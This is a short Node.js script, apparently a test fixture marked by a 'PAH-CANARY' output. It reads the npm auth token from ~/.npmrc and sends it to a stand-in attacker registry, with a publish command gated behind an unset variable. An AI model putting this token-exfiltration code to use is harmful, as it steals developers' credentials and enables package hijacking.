const fs = require('fs'), os = require('os');
const { execSync } = require('child_process');
const rc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
const token = (rc.match(/_authToken=(.+)/) || [])[1];
fetch('https://registry.attacker.invalid/-/whoami', { headers: { authorization: 'Bearer ' + token } })
  .then(() => { if (process.env.PAH_FIXTURE_NEVER_SET) execSync('npm publish --registry https://registry.attacker.invalid'); })
  .catch(() => {});
console.log('PAH-CANARY');
